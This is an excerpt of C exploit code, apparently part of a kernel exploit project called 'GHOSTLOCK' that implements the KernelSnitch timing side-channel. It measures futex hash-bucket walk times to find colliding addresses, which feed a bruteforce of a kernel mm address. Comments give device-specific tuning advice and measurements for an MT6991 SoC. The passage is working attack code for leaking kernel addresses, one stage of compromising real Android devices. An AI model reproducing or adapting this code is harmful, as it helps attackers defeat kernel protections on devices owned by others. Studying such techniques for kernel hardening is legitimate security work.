...
#error "KERNELSNITCH_THRESHOLD_MULT is not defined; it belongs in the device target.h"
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    ...
    /* How much slower than an empty bucket a walk has to be before we call it a
     * collision. This is a pure timing threshold, so it is a property of the
     * SoC's cache and memory system, not of the kernel -- and getting it wrong
     * is quiet: too permissive and three *false* collisions are accepted here,
     * after which the bruteforce searches for an mm consistent with addresses
     * that do not actually share a bucket, and fails with no other symptom.
     * GHOSTLOCK_KS_THRESHOLD sweeps it on device without a rebuild. */
    size_t threshold_mult = KERNELSNITCH_THRESHOLD_MULT;
    {
        const char *__t = getenv("GHOSTLOCK_KS_THRESHOLD");
        if (__t && *__t) {
            long __n = strtol(__t, NULL, 0);
            if (__n > 0) threshold_mult = (size_t)__n;
        }
    }
    size_t accept_min = (size_t)-1, accept_max = 0, reject_max = 0;
    ...
    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
        ...
        if (ks->times[i] <= (approx_time*threshold_mult)) {
            /* rejected: track these separately, or the "gap" the line below is
             * meant to show is just the accepted maximum repeated back */
            if (ks->times[i] > reject_max) reject_max = ks->times[i];
        }
        if (ks->times[i] > (approx_time*threshold_mult)) {
            count++;
            ks->futex_addrs[count] = futex_addr;
            if (ks->times[i] < accept_min) accept_min = ks->times[i];
            if (ks->times[i] > accept_max) accept_max = ks->times[i];
            if (ks->verbose) pr_info("  %016zx t=%zd\n", futex_addr, ks->times[i]);
        }
    }
    /* Printed unconditionally: when the bruteforce later fails, this line is
     * what says whether the collisions it was given were real. A healthy run
     * has accepted times far above threshold and a clear gap to reject_max.
     * Measured on MT6991: baseline 8, threshold 80, accepted 1244..1597 --
     * roughly 150x the baseline, so the separation is not marginal. */
    pr_info("ks collisions=%zd/%zd baseline=%zd threshold=%zdx (%zd) "
            "accepted=[%zd..%zd] slowest_rejected=%zd\n",
            count, wanted, approx_time, threshold_mult,
            approx_time * threshold_mult,
            (accept_min == (size_t)-1) ? 0 : accept_min, accept_max, reject_max);
    if (wanted == count) {
